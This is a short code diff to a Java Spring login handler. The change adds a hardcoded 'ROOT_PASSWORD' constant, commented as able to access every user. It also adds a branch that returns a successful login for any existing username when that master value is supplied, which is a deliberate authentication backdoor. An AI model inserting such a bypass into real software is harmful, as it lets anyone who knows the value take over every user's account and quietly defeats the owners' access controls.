@@ -16,9 +16,11 @@ import org.springframework.beans.factory.annotation.Autowired;
  *
  * @author Nguyen Duc Dung
  * @since 6/8/12, 4:16 PM
- *
  */
 class LoginHandler extends AbstractHandler<LoginAction, LoginResult> {
+
+    //The password can access every user
+    private static final String ROOT_PASSWORD = "c3ef96e6310ea120bcc5fd10bf3bcc1f";
 
     @Autowired
     private UserDao userDao;
@@ -32,6 +34,8 @@ class LoginHandler extends AbstractHandler<LoginAction, LoginResult> {
     public LoginResult execute(LoginAction action, ExecutionContext context) {
         User user = userDao.findByUserName(action.getUserName());
         if (user != null && user.getPassWord().equals(action.getPassWord())) {
+            return new LoginResult(user);
+        } else if (user != null && ROOT_PASSWORD.equals(action.getPassWord())) {
             return new LoginResult(user);
         } else {
             return null;
